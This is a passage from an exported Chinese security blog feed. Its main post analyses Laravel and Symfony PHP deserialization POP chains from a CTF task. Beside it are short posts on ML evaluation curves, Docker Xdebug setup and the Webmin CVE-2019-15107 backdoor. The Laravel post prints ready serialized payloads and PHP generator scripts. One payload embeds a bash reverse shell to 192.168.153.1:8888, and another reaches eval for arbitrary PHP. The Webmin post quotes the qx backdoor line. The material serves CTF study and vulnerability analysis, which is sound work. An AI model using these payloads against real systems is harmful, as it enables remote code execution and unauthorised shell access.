(Recall)，都可以用AUC来衡量分类器的效果。不同点是ROC曲线使用了FPR，而PR曲线使用了Precision，因此PR曲线的两个指标都聚焦于正例。类别不平衡问题中由于主要关心正例，所以在此情况下PR曲线被认为优于ROC曲线。 PR曲线特点 PR曲线可以用来判定一个输出概率的模型（需要设定阈值）的好坏 PR曲线越接近右上角，则模型越好 PR曲线的面积（AUC）越接近1，则模型越好 PR曲线的折线段数与样本的数量一致，所以样本越多，PR曲线越光滑 PR曲线使用了Recall与Precision，因此PR曲线的两个指标都聚焦于正例。 综上，PR适合衡量一个模型在正样例上的表现，适合处理不平衡问题。 Regression Error Characteristic 简介 REC曲线是在ROC曲线的基础下提出的用来衡量回归模型好坏的方法。 作图方法 REC曲线的横坐标是回归误差容忍度ε，纵坐标是在容忍度内的“正确分类”的百分比，即若在容忍度内则记为“正确分类”时模型的准确率。通过更改容忍度可绘制出REC曲线。 在容忍度内的定义： 首先定义一个代价函数，如差值平方、绝对值等。 若代价函数小于ε，则认定该预测在容忍度内预测正确。 特点 AOC AOC（area-over-the-curve）面积为该模型的不准确率的期望，即随机选择一个阈值时，1与其准确率的期望的差。 其定义为： \\[ E(ε)=\\int_{0}^{ε_{m}}p(ε)dε+\\int_{ε_{m}}^{+\\infty}p(ε)dε \\] 即曲线与y=1所围成的面积。 （原论文中的公式如下，个人感觉不太对，在这里也贴出来：） \\[ E(ε)=\\int_{0}^{ε_{m}}εp(ε)dε+\\int_{ε_{m}}^{+\\infty}εp(ε)dε \\] 由图像可以得出，AOC只需要计算\\(ε_m\\)之前的积分就够了。 REC曲线特点： REC曲线可以用来判定一个输出概率的模型（需要设定阈值）的好坏 REC曲线越接近左上角，则模型越好 AOC越接近0，则模型越好 REC曲线的折线段数与样本的数量一致，所以样本越多，REC曲线越光滑 由于REC的横纵坐标与样本比例无关，与ROC类似，即使正例与负例的比例发生了很大变化（样本不平衡），REC曲线也不会产生大的变化。 综上，REC适合衡量一个模型本身。 肘部方法 与ROC类似，REC也有肘部方法可以用来确定合适的ε值，我们希望模型越精细越好，所以ε越小越好；同时我们也希望准确率越大越好。如果将这两个指标等同看待，则有肘部处的ε最好（证明方法跟ROC基本一致）。 参考资料 https://zhuanlan.zhihu.com/p/34655990 Regression Error Characteristic Curves","categories":[{"name":"机器学习","slug":"机器学习","permalink":"https://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"https://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"Laravel POP链简析","slug":"Laravel-POP链简析","date":"2019-09-06T11:51:37.000Z","updated":"2025-02-06T15:11:50.730Z","comments":true,"path":"posts/Web安全/20190906-laravel_pop1.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190906-laravel_pop1.html","excerpt":"Laravel POP链简析 Laravel POP链简析 前言 基本概念 0x00 Symfony POP链 复现 POP链跟踪 0x01 Laravel 5.8 POP链 复现 POP链分析 总结 参考资料 前言 POP链与PHP反序列化漏洞利用是密不可分的概念，反序列化漏洞相关的知识在网上有很多，这里不再赘述。本文主要对laravel的POP链简析。","text":"Laravel POP链简析 Laravel POP链简析 前言 基本概念 0x00 Symfony POP链 复现 POP链跟踪 0x01 Laravel 5.8 POP链 复现 POP链分析 总结 参考资料 前言 POP链与PHP反序列化漏洞利用是密不可分的概念，反序列化漏洞相关的知识在网上有很多，这里不再赘述。本文主要对laravel的POP链简析。 基本概念 POP（Property Oriented Programming）：面向属性编程；可以与ROP类比。 POP链（POP CHAIN）：把魔术方法作为入口，然后在魔术方法中调用其他函数，通过寻找一系列函数，最后执行恶意代码，就构成了POP CHAIN 。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制反序列化的类的属性，从而执行POP CHAIN，达到利用特定漏洞的效果。 在构造POP链时，攻击者可以控制流程中的所有形如this-&gt;xxx的变量和相关函数。 0x00 Symfony POP链 此POP chain出现在2019年国赛决赛的一道web题中（原题因为出题人忘记清除访问记录导致POP链暴露，题被刷爆了XD），在laravel 5.8并且安装有symfony组件时存在POP链。 复现 glzjin师傅将题目上传了，题目地址：https://github.com/glzjin/CISCN_2019_Final_9_Day1_Web4 为了调试漏洞，我在复现时使用上一篇博客中的docker，然后直接将source.tar.gz复制解压就搭建好可以调试的环境了。 整个POP链的官方payload如下（在后面会有一些简化，payload与此处不大一致）： 1O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bi%3A1%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A53%3A%22bash%20-c%20&apos;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.153.1%2F8888%200%3E%261&apos;%22%3Bs%3A11%3A%22%00%2A%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00%2A%00expiry%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A2%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B%7D%7D 构造的对象内容如下（中间的%00不能复制，替换成了%20）： 12345678910111213141516171819202122232425262728293031O:47:&quot;Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter&quot;:2:&#123; s:57:&quot; Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter deferred&quot;; a:1: &#123; i:1; O:33:&quot;Symfony\\Component\\Cache\\CacheItem&quot;:3: &#123; s:12:&quot; * innerItem&quot;; s:53:&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/192.168.153.1/8888 0&gt;&amp;1&apos;&quot;; s:11:&quot; * poolHash&quot;; s:1:&quot;1&quot;; s:9:&quot; * expiry&quot;; s:1:&quot;1&quot;; &#125; &#125; s:53:&quot;Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter pool&quot;; O:44:&quot;Symfony\\Component\\Cache\\Adapter\\ProxyAdapter&quot;:2: &#123; s:58:&quot;Symfony\\Component\\Cache\\Adapter\\ProxyAdapter setInnerItem&quot;; s:6:&quot;system&quot;; s:54:&quot;Symfony\\Component\\Cache\\Adapter\\ProxyAdapter poolHash&quot;; s:1:&quot;1&quot;; &#125; &#125; 访问： http://192.168.153.128:10086/public/?payload=O%3A47%3A%22Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%22%3A2%3A{s%3A57%3A%22%00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%00deferred%22%3Ba%3A1%3A{i%3A1%3BO%3A33%3A%22Symfony\\Component\\Cache\\CacheItem%22%3A3%3A{s%3A12%3A%22%00*%00innerItem%22%3Bs%3A53%3A%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.153.1%2F8888%200%3E%261%27%22%3Bs%3A11%3A%22%00*%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00*%00expiry%22%3Bs%3A1%3A%221%22%3B}}s%3A53%3A%22%00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony\\Component\\Cache\\Adapter\\ProxyAdapter%22%3A2%3A{s%3A58%3A%22%00Symfony\\Component\\Cache\\Adapter\\ProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony\\Component\\Cache\\Adapter\\ProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B}} 即可反弹shell。 POP链跟踪 在进行POP链跟踪时，我尝试从构造者的角度进行解析，分析在实战中如何找到POP链。 首先，全局找出一个可以利用的魔术方法（实际寻找时，需要挨个查看，并每个深入分析），发现在 vendor\\symfony\\symfony\\src\\Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter.php 中包含一个__destruct： 1234public function __destruct()&#123; $this-&gt;commit();&#125; 跟进： 1234public function commit()&#123; return $this-&gt;invalidateTags([]);&#125; 跟进，由于构造了deferred，在第125行会按照deferred逐个调用，进入saveDeferred函数： 123456789101112131415161718192021222324252627282930313233343536373839public function invalidateTags(array $tags) &#123; $ok = true; $tagsByKey = []; $invalidatedTags = []; foreach ($tags as $tag) &#123; CacheItem::validateKey($tag); $invalidatedTags[$tag] = 0; &#125; if ($this-&gt;deferred) &#123; $items = $this-&gt;deferred; foreach ($items as $key =&gt; $item) &#123; if (!$this-&gt;pool-&gt;saveDeferred($item)) &#123; //跟进这里 unset($this-&gt;deferred[$key]); $ok = false; &#125; &#125; $f = $this-&gt;getTagsByKey; $tagsByKey = $f($items); $this-&gt;deferred = []; &#125; $tagVersions = $this-&gt;getTagVersions($tagsByKey, $invalidatedTags); $f = $this-&gt;createCacheItem; foreach ($tagsByKey as $key =&gt; $tags) &#123; $this-&gt;pool-&gt;saveDeferred($f(static::TAGS_PREFIX.$key, array_intersect_key($tagVersions, $tags), $items[$key])); &#125; $ok = $this-&gt;pool-&gt;commit() &amp;&amp; $ok; if ($invalidatedTags) &#123; $f = $this-&gt;invalidateTags; $ok = $f($this-&gt;tags, $invalidatedTags) &amp;&amp; $ok; &#125; return $ok; &#125; 在这里需要对 this-&gt;pool 进行构造，全局找到一个类包含 saveDeferred 函数并且能够被利用；经过一番寻找，发现在 vendor\\symfony\\symfony\\src\\Symfony\\Component\\Cache\\Adapter\\ProxyAdapter.php 中存在可以利用的类（在实际寻找中，需要跟进到执行命令那一步才能确认POP链可用）。 跟进到 ProxyAdapter.php 中： 1234public function saveDeferred(CacheItemInterface $item)&#123; return $this-&gt;doSave($item, __FUNCTION__);&#125; 继续跟进，在223行调用了 ($this-&gt;setInnerItem)($innerItem, $item) （注：此语法是php7.1之后某版本的新语法，在旧版本中不能成功执行）： 12345678910111213141516171819202122232425private function doSave(CacheItemInterface $item, $method)&#123; if (!$item instanceof CacheItem) &#123; return false; &#125; $item = (array) $item; if (null === $item[\"\\0*\\0expiry\"] &amp;&amp; 0 &lt; $item[\"\\0*\\0defaultLifetime\"]) &#123; $item[\"\\0*\\0expiry\"] = microtime(true) + $item[\"\\0*\\0defaultLifetime\"]; &#125; if ($item[\"\\0*\\0poolHash\"] === $this-&gt;poolHash &amp;&amp; $item[\"\\0*\\0innerItem\"]) &#123; $innerItem = $item[\"\\0*\\0innerItem\"]; &#125; elseif ($this-&gt;pool instanceof AdapterInterface) &#123; // this is an optimization specific for AdapterInterface implementations // so we can save a round-trip to the backend by just creating a new item $f = $this-&gt;createCacheItem; $innerItem = $f($this-&gt;namespace.$item[\"\\0*\\0key\"], null); &#125; else &#123; $innerItem = $this-&gt;pool-&gt;getItem($this-&gt;namespace.$item[\"\\0*\\0key\"]); &#125; ($this-&gt;setInnerItem)($innerItem, $item);//注意这里 return $this-&gt;pool-&gt;$method($innerItem);&#125; 在此处可以动态调用函数， $this-&gt;setInnerItem 值可控，但是 $innerItem 的值不能一眼看出可控， $innerItem 的值有多种赋值方法，实际情况下需要分析后进一步找出如何控制 $innerItem 的值。 注意到如下： 123if ($item[\"\\0*\\0poolHash\"] === $this-&gt;poolHash &amp;&amp; $item[\"\\0*\\0innerItem\"]) &#123; $innerItem = $item[\"\\0*\\0innerItem\"]; &#125; 回溯到 invalidateTags 函数中，注意到 $items = $this-&gt;deferred; ，而$items会被进一步解析到 $item ，所以此处的 $item 是可控的。在这里，需要使 $item[&quot;\\0*\\0poolHash&quot;] === $this-&gt;poolHash &amp;&amp; $item[&quot;\\0*\\0innerItem&quot;] ，这是什么意思呢，在PHP中，将一个对象被强行转换为array时，它的属性就会根据其是private或protected变成相应的字符串；所以在这里，还需要两个类的 poolHash 属性，使之相等，这时就能控制动态调用函数的第一个参数了。所以在这里需要在全局找到一个类，它包含有 poolHash 属性和 innerItem 属性；在这里找到的是 vendor\\symfony\\symfony\\src\\Symfony\\Component\\Cache\\CacheItem.php 中的 CacheItem 类： 123456789101112131415final class CacheItem implements ItemInterface&#123; private const METADATA_EXPIRY_OFFSET = 1527506807; protected $key; protected $value; protected $isHit = false; protected $expiry; protected $defaultLifetime; protected $metadata = []; protected $newMetadata = []; protected $innerItem; protected $poolHash; protected $isTaggable = false; ...... 此时我们已经可以做到任意调用一个函数，这个函数的第一个参数我们可以控制；这个时候，需要找到一个PHP命令执行函数，它可以有两个参数，并且只需要第一个参数就能达到RCE的效果。 查看system函数的文档： system ( string $command [, int &amp;$return_var ] ) : string ，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。传入两个参数是可以成功调用的。 综合起来，控制函数名为 system ，第一个参数为待执行的函数，就可以执行系统命令。设置 $this-&gt;setInnerItem 的值为 system ， $innerItem 值为待执行的命令，从而执行了任意指令，达到RCE的目的。 简化之后的payload构造代码如下（修改自mochazz师傅的构造代码）： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Symfony\\Component\\Cache&#123; final class CacheItem &#123; protected $poolHash; protected $innerItem; public function __construct( $poolHash, $command) &#123; $this-&gt;poolHash = $poolHash; $this-&gt;innerItem = $command; &#125; &#125;&#125;namespace Symfony\\Component\\Cache\\Adapter&#123; class ProxyAdapter &#123; private $poolHash; private $setInnerItem; public function __construct($poolHash, $func) &#123; $this-&gt;poolHash = $poolHash; $this-&gt;setInnerItem = $func; &#125; &#125; class TagAwareAdapter &#123; private $deferred = []; private $pool; public function __construct($deferred, $pool) &#123; $this-&gt;deferred = $deferred; $this-&gt;pool = $pool; &#125; &#125;&#125;namespace &#123; $cacheitem = new Symfony\\Component\\Cache\\CacheItem(1,\"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.153.1/8888 0&gt;&amp;1'\"); $proxyadapter = new Symfony\\Component\\Cache\\Adapter\\ProxyAdapter(1,'system'); $tagawareadapter = new Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter(array($cacheitem),$proxyadapter); echo urlencode(serialize($tagawareadapter));&#125; 至此，symfony POP链寻找与调用分析完毕。 0x01 Laravel 5.8 POP链 在原赛题中，出题者直接把这条利用链的入口 __destruct 函数注释了。 复现 只需要把 vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php 第57行的注释还原即可复现。 payload如下： 1O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A18%3A%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3B%7D%7D%7D 访问 http://192.168.153.129:10086/public/?payload=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A18%3A%22%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3B%7D%7D%7D 即可调用phpinfo POP链分析 首先是入口魔术方法， vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php 第57行： 1234public function __destruct()&#123; $this-&gt;events-&gt;dispatch($this-&gt;event);&#125; 这里需要寻找一个类，它包含dispatch函数并且能够被进一步利用。 在这里找到 vendor\\laravel\\framework\\src\\Illuminate\\Bus\\Dispatcher.php 中的Dispatcher类可以进一步利用，跟进 dispatch ： 12345678public function dispatch($command) &#123; if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123; return $this-&gt;dispatchToQueue($command); &#125; return $this-&gt;dispatchNow($command); &#125; 这里第一个条件需要满足 $this-&gt;commandShouldBeQueued($command) ，查看代码，需要 $command 必须是一个实现了 ShouldQueue 接口的类： 1234protected function commandShouldBeQueued($command)&#123; return $command instanceof ShouldQueue;&#125; 在这里，找到 vendor\\laravel\\framework\\src\\Illuminate\\Foundation\\Console\\QueuedCommand.php 中的 QueuedCommand 类是满足条件并且能够进一步利用的： 1234class QueuedCommand implements ShouldQueue&#123; ...&#125; 继续跟进 return $this-&gt;dispatchToQueue($command); ： 12345678910111213141516public function dispatchToQueue($command) &#123; $connection = $command-&gt;connection ?? null; $queue = call_user_func($this-&gt;queueResolver, $connection);//注意此处 if (! $queue instanceof Queue) &#123; throw new RuntimeException('Queue resolver did not return a Queue implementation.'); &#125; if (method_exists($command, 'queue')) &#123; return $command-&gt;queue($queue, $command); &#125; return $this-&gt;pushCommandToQueue($queue, $command); &#125; 很容易地注意到 $queue = call_user_func($this-&gt;queueResolver, $connection); 调用了 call_user_func ，并且 $this-&gt;queueResolver 可控，回溯后也很容易发现 $command 也可控（通过 $this-&gt;event 即可控制）。所以在这里可以执行任意类包含的函数。在这里就需要找出一个类，它能够执行任意函数， 在 vendor\\mockery\\mockery\\library\\Mockery\\Loader\\EvalLoader.php 中出现了能够利用的类 EvalLoader ，这里的 load 函数通过eval直接执行了任意代码，并且 code 属性可控；所以可以调用该类的 load 函数，从而执行任意PHP代码；但是在之前有一个条件语句，所以在这里还需要找到两个类，第一个类具有 code 属性；第二个类有 getName 函数，用来作为第一个类的config属性： 1234567891011class EvalLoader implements Loader&#123; public function load(MockDefinition $definition) &#123; if (class_exists($definition-&gt;getClassName(), false)) &#123;//注意这个条件，需要再找一个类 return; &#125; eval(\"?&gt;\" . $definition-&gt;getCode()); &#125;&#125; 其中， getClassName 函数内容如下： 1234public function getClassName() &#123; return $this-&gt;config-&gt;getName(); &#125; 在这里找到的两个类是 vendor\\mockery\\mockery\\library\\Mockery\\Generator\\MockDefinition.php 和 vendor\\nikic\\php-parser\\lib\\PhpParser\\Node\\Scalar\\MagicConst\\Line.php ： 123456class MockDefinition&#123; protected $config; protected $code;...&#125; 1234567class Line extends MagicConst&#123; public function getName() : string &#123; return '__LINE__'; &#125; ...&#125; OK，到这里，我们一共找到了6个类，经过一系列的分析，终于能够执行任意PHP代码了；mochazz师傅给出的payload如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,'&lt;?php phpinfo();?&gt;'); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,'load')); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125;?&gt; 至此，Laravel 5.8 POP链寻找与调用分析完毕；整个POP链较第一个POP链要复杂的多，设计到了6个类的寻找，可以想象真正构造时还是很费力的。 总结 在构造POP链的时候， this-&gt;xxx 是我们可以任意赋值的。 如果 this-&gt;xxx 是调用的对象，则需要全局搜索，找出可以利用的类进一步分析，此时可以看作POP链进行到了下一环。 最后动态调用的时候，则需要阅读PHP文档，找出参数数量、位置都符合的利用函数。 在进行POP链构造时，需要很高的PHP功底，熟悉整个框架中能够利用的类，充分理解类相关的概念；同时，需要想象每种情况下的执行情况，对各个条件分支都有考虑。 PHP字符串动态调用在POP链构造时一般不能起作用（在类中的属性字符串不能动态调用，除非是PHP7.1且加上括号的新语法）。 构造payload时，若出现protected或private属性时，可以在 __construct 函数下直接赋值避免写get、set函数组。 参考资料 Code Reuse Attacks in PHP: Automated POP Chain Generation https://xz.aliyun.com/t/5911","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"docker中的php7代码调试","slug":"docker中的php7代码调试","date":"2019-09-03T13:19:54.000Z","updated":"2025-02-06T15:11:50.608Z","comments":true,"path":"posts/环境搭建/20190903-php7_xdebug.html","link":"","permalink":"https://hachp1.github.io/posts/环境搭建/20190903-php7_xdebug.html","excerpt":"docker中的php7代码调试 前言 最近想好好看看PHP反序列化POP链的构造，加上之前遇到的laravel的题，想把挖的坑埋了，于是开始漫长的环境搭建之旅。。。 由于laravel是在PHP7环境下的框架，我在物理机上使用的phpstudy怎么都无法成功调试，最近又迷上docker的一次搭建万年使用并且随时还原的方便（使用爽，构建火葬场）；使用docker可以做到php版本灵活切换，在这里把遇到的坑和一些产物记录下来。","text":"docker中的php7代码调试 前言 最近想好好看看PHP反序列化POP链的构造，加上之前遇到的laravel的题，想把挖的坑埋了，于是开始漫长的环境搭建之旅。。。 由于laravel是在PHP7环境下的框架，我在物理机上使用的phpstudy怎么都无法成功调试，最近又迷上docker的一次搭建万年使用并且随时还原的方便（使用爽，构建火葬场）；使用docker可以做到php版本灵活切换，在这里把遇到的坑和一些产物记录下来。 搭建过程 本文的搭建方法主要参考自http://ramkulkarni.com/blog/setting-up-and-debugging-php7-in-docker/ 坑 国内环境下原Dockerfile不能成功下载程序 原文中的VScode配置过时，需要更改为新的模式 PHPstorm在配好环境后仍然不能正常debug，只能停在第一行的断点处，并且继续执行下一行时失去连接。抓包后可以看到双方都有通讯，从而不是服务器端的问题。 吹爆VScode！ 踩完坑后的搭建过程 Docker服务器端 Dockerfile已上传：https://github.com/HACHp1/docker_php7_apache_xdebug 首先，修改php.ini文件使之与你的环境一致： 123456[xdebug]zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20160303/xdebug.so #（此处如果要更改php7的版本，则需要进一步操作，操作在后文中出现）xdebug.remote_enable=1xdebug.remote_autostart=1xdebug.remote_host=192.168.153.1 #（此处修改为你VScode所在的主机）xdebug.remote_port=9000 然后，build Dockerfile： 1docker build -t php7_xdebug . 记下返回的id。 然后运行container： 1docker run -d -p 10086:80 --name php7_xdebug --restart=always 刚刚返回的id VScode端 在插件中直接搜索安装 PHP Debug 在配置中设置，其中的pathMappings后面设置VScode端的项目路径，此处设置了本地到远程的文件目录映射： 12345678910&#123; &quot;name&quot;: &quot;Listen for XDebug&quot;, &quot;type&quot;: &quot;php&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;stopOnEntry&quot;: true, &quot;pathMappings&quot;: &#123; &quot;/var/www/html&quot;:&quot;C:\\\\Users\\\\...\\\\php7_docker&quot; &#125;, &quot;port&quot;: 9000 &#125; 至此，就可以打好断点愉快地debug了： 更改php7版本 首先修改Dockerfile中的php7版本 构建并运行container后，输入： 1find / -name xdebug.so 将返回结果替换到php.ini中的zend_extension=之后 重新启动container中的服务器 继续后续操作即可（换版本时主要是需要把php.ini中的路径重新设置好） 参考资料 http://ramkulkarni.com/blog/setting-up-and-debugging-php7-in-docker/ https://jonathansblog.co.uk/remote-debugging-php-in-visual-studio-code-with-xdebug","categories":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://hachp1.github.io/categories/环境搭建/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://hachp1.github.io/tags/Web安全/"}]},{"title":"Webmin RCE(CVE-2019-15107)简析","slug":"Webmin-RCE-CVE-2019-15107-简析","date":"2019-08-23T16:20:08.000Z","updated":"2025-02-06T15:11:51.173Z","comments":true,"path":"posts/Web安全/20190824-webmin.html","link":"","permalink":"https://hachp1.github.io/posts/Web安全/20190824-webmin.html","excerpt":"Webmin RCE(CVE-2019-15107)简析 写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。","text":"Webmin RCE(CVE-2019-15107)简析 写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。 简介 Webmin是一个基于Web的界面，用于Unix的系统管理。使用任何支持表和表单的浏览器，可以设置用户帐户，Apache，DNS，文件共享等。 2019年8月10日，pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。 该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是SourceForge上某些版本的安装包和源码被植入了后门导致的。 Dockerfile构建 踩过了一些环境搭建的坑后得到了两大版本的可以复现的dockerfile，直接上地址： https://github.com/HACHp1/webmin_docker_and_exp 复现 v1.920 首先在v1.920版本复现： 使用用户名：root，密码：pass登陆；之后进入webmin权限设置界面: 将提醒用户修改过期密码提示打钩并保存： 待webmin重启后，进入webmin user界面添加新用户（新建用户后登陆新用户才会进入修改密码界面）： 勾选强制修改选项： 注销当前用户，登陆新用户，此时会要求修改密码： 截包，可以在old参数注入命令： 反弹shell： v1.890 在@Ethan搜寻漏洞成因的过程中，发现在版本v1.890中有明显的后门代码，可以直接通过expired参数执行命令，在post参数中仅添加expired参数就能够执行命令（我直接写的脚本，就不截图了）。 EXP编写 根据复现情况很容易可以写出EXP：https://github.com/HACHp1/webmin_docker_and_exp 漏洞原理以及修复方案分析 既然是后门，调用起来就比较容易，执行过程也比较好分析。 v1.890 通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门： 在后门版本中，后门执行代码为：$in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;，代码使用qx直接执行了expired参数。而正常版本中，此处只是提示密码修改模式未开启：$miniserv{'passwd_mode'} == 2 || die &quot;Password changing is not enabled!&quot;;。并且在之前没有任何if逻辑，使此处的RCE不需要其他条件便能执行（而在1.9x中，需要一些条件才能执行到系统命令）。 v1.920 类似1.890版本，通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门： 但是在1.920版本中，由于执行条件的问题，默认配置不能RCE；一般来讲，攻击者都是要使利用面尽可能的广的，但是此处攻击者的做法却使攻击成功的可能性大大降低，可能是由于攻击者自身对webmin的执行过程不熟悉，认为执行条件是默认条件而产生疏忽所致。 代码执行主要流程如下： 首先，在第12行需要passwd_mode为2，也就是之前复现中的“将提醒用户修改过期密码提示打钩并保存”这步会将其设置为2。由于webmin默认并不会设置其为2，这一步就会使绝大多数受害机不会遭受RCE。 1$miniserv&#123;'passwd_mode'&#125; == 2 || die \"Password changing is not enabled!\"; 此外，根据以下代码中的if ($wuser-&gt;{'pass'} eq 'x')可知，如果user是unix的权限用户（root），则将其复制为undef，此时将不会进入后门触发处，所以在利用后门时，需要使用非root的用户。 123456789101112131415161718192021222324252627282930# Is this a Webmin user?if (&amp;foreign_check(\"acl\")) &#123; &amp;foreign_require(\"acl\", \"acl-lib.pl\"); ($wuser) = grep &#123; $_-&gt;&#123;'name'&#125; eq $in&#123;'user'&#125; &#125; &amp;acl::list_users(); if ($wuser-&gt;&#123;'pass'&#125; eq 'x') &#123; # A Webmin user, but using Unix authentication $wuser = undef; &#125; elsif ($wuser-&gt;&#123;'pass'&#125; eq '*LK*' || $wuser-&gt;&#123;'pass'&#125; =~ /^\\!/) &#123; &amp;pass_error(\"Webmin users with locked accounts cannot change \". \"their passwords!\"); &#125; &#125;if (!$in&#123;'pam'&#125; &amp;&amp; !$wuser) &#123; $miniserv&#123;'passwd_cindex'&#125; ne '' &amp;&amp; $miniserv&#123;'passwd_mindex'&#125; ne '' || die \"Missing password file 